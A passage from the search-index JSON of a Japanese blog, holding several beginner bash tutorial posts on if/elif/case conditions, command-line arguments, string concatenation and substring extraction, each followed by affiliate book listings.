","date":"2022-01-12T13:40:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-12-01-ani/","title":"e-Statで新着一覧を取得しよう"},{"content":"or 条件を if文で使う orロジックでifステートメントを使用する：\n\u0026lsquo;||\u0026lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。\n#!/bin/bash echo \u0026#34;数値を入力して下さい。\u0026#34;; read n; if [[ (\u0026#34;$n\u0026#34; -eq 15 || \u0026#34;$n\u0026#34; -eq 45) ]];then echo \u0026#34;ゲームに勝ちました\u0026#34;; else echo \u0026#34;ゲームに負けました\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_or.sh 数値を入力して下さい。 5 ゲームに負けました $ bash if_with_or.sh 数値を入力して下さい。 45 ゲームに勝ちました bash-5.1$ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-10-suzuki/","title":"【１０．or 条件を if文で使う】ざっくりわかる「シェルスクリプト」"},{"content":"else if と else else ifステートメントの使用：\nelse if条件の使用は、bashでは「elif」を定義します。\u0026rsquo;elseif_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; if [ \u0026#34;$n\u0026#34; -eq 101 ];then echo \u0026#34;あなたは一等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 510 ];then echo \u0026#34;あなたは二等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 999 ];then echo \u0026#34;あなたは三等賞を獲得しました\u0026#34;; else echo \u0026#34;すみません、またチャレンジして下さい\u0026#34;; fi bashコマンドでファイルを実行します。\nbash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 100 すみません、またチャレンジして下さい bash$ bash elseif_example.sh $ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-11-suzuki/","title":"【１１．else if と else】ざっくりわかる「シェルスクリプト」"},{"content":"case 文 caseステートメントの使用：\ncaseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。\u0026lsquo;case_example.sh\u0026rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; case \u0026#34;$n\u0026#34; in 101) echo \u0026#34;あなたは一等賞を獲得しました\u0026#34; ;; 510) echo \u0026#34;あなたは二等賞を獲得しました\u0026#34; ;; 999) echo \u0026#34;あなたは三等賞を獲得しました\u0026#34; ;; *) echo \u0026#34;すみません、またチャレンジして下さい\u0026#34; esac bashコマンドでファイルを実行します。\nbash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 510 あなたは二等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 777 すみません、またチャレンジして下さい ヒント case文の終わりには esac を指定します。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-12-suzuki/","title":"【１２．case 文】ざっくりわかる「シェルスクリプト」"},{"content":"コマンドラインから引数を取得 コマンドラインから引数を取得：\nBashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。\n#!/bin/bash echo \u0026#34;引数の数 : $#\u0026#34;; echo \u0026#34;一つ目の引数 = $1\u0026#34;; echo \u0026#34;二つ目の引数 = $2\u0026#34;; bashコマンドでファイルを実行します。\n$ bash command_line.sh apple windows 引数の数 : 2 一つ目の引数 = apple 二つ目の引数 = windows $ ヒント echo の引数として変数を渡すときは、\u0026quot;$1\u0026quot; のようにダブルクォートで囲む癖をつけます。 $1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。 シェルスクリプトの変数はほとんどの場合は \u0026ldquo;$value\u0026rdquo; と囲みます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-13-suzuki/","title":"【１３．コマンドラインから引数を取得】ざっくりわかる「シェルスクリプト」"},{"content":"名前を使用してコマンドラインから引数を取得する コマンドラインから名前付きの引数を取得：\n名前付きのコマンドライン引数を読み取る方法を示します。\u0026lsquo;command_line_names.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。\n#!/bin/bash for arg in \u0026#34;$@\u0026#34;;do index=$(echo $arg | cut -f1 -d=); val=$(echo $arg | cut -f2 -d=); case $index in X) x=$val;; Y) y=$val;; *) esac done ((result=x+y)); echo \u0026#34;X+Y=$result\u0026#34;; bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。\n$ bash command_line_names.sh X=45 Y=30 X+Y=75 $ ヒント case文で入力された文字列の大文字と小文字に対応する。 または文字列に対応する場合は以下のソースを見て欲しい。 レベルアップしたソースコードはささいな気遣いから生まれる #! /bin/bash case \u0026#34;$1\u0026#34; in [Yy]|\u0026#34;yes\u0026#34;)\t#Y、yまたはyesという文字列 echo \u0026#34;YES\u0026#34; echo \u0026#34;OK\u0026#34; ;; [Nn]|\u0026#34;no\u0026#34;)\t#N、nまたはnoという文字列 echo \u0026#34;NO\u0026#34; ;; *) echo \u0026#34;undefined\u0026#34;;; esac 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-14-suzuki/","title":"【１４．名前を使用してコマンドラインから引数を取得する】ざっくりわかる「シェルスクリプト」"},{"content":"変数に2つの文字列を組み合わせる 文字列変数を組み合わせる：\n文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。\n#!/bin/bash string1=\u0026#34;Apple\u0026#34;; string2=\u0026#34;Mac OS\u0026#34;; echo \u0026#34;$string1 $string2\u0026#34;; string3=\u0026#34;$string1 $string2\u0026#34;; string3+=\u0026#34; は、とても優れたＯＳです。\u0026#34; ; echo $string3; bashコマンドでファイルを実行します。\n$ bash string_combine.sh Apple Mac OS Apple Mac OS は、とても優れたＯＳです。 $ ヒント Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。 変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。\n#!/bin/sh str1 = \u0026#34;Shell script\u0026#34; str = \u0026#34;${str1} is intersting!!\u0026#34; echo $str $ bash string_example2.sh $ Shell script is interesting!! $ 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-15-suzuki/","title":"【１５．変数に2つの文字列を組み合わせる】ざっくりわかる「シェルスクリプト」"},{"content":"文字列の部分文字列を取得する 文字列の部分文字列を取得します。\n他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。\n#!/bin/bash Str=\u0026#34;Learn Bash from NLP\u0026#34;; subStr=${Str:6:4}; echo \u0026#34;$subStr\u0026#34;; bashコマンドでファイルを実行します。\n$ bash substring_example.sh Bash $ ヒント 基本パターンは以下の通り ${パラメータ:オフセット:長さ}\n: Bashでの文字列の切り出しはかなりの頻度で使います。 知っているのと知らないのとでは、苦労が違ってきます。 具体例を以下にしめします。 #!/bin/bash HOGE=\u0026#34;abcdef\u0026#34; # オフセット位置から長さ分を取得 echo ${HOGE:0:2} # -\u0026gt; ab echo ${HOGE:2:2} # -\u0026gt; cd echo ${HOGE:4:2} # -\u0026gt; ef # 長さを省略した場合はオフセットから最後まで出力 echo ${HOGE:2} # -\u0026gt; cdef # 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる echo ${HOGE:0:-2} # -\u0026gt; abcd # オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定) # 指定した変数が空文字列の場合は右に指定した文字が入る echo ${HOGE:-2} # -\u0026gt; abcdef HOGE= echo ${HOGE:-2} # -\u0026gt; 2 #!/bin/bash HOGE=hoge.tar.bz2 echo ${HOGE} # -\u0026gt; hoge.tar.bz2 # 最短除外 echo ${HOGE%.*} # -\u0026gt; hoge.tar # 最長除外 echo ${HOGE%%.*} # -\u0026gt; hoge #!/bin/bash HOGE=/home/user/hoge echo ${HOGE} # -\u0026gt; /home/user/hoge # 最短除外 echo ${HOGE#*/} # -\u0026gt; home/user/hoge # 最長除外 echo ${HOGE##*/} # -\u0026gt; hoge 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 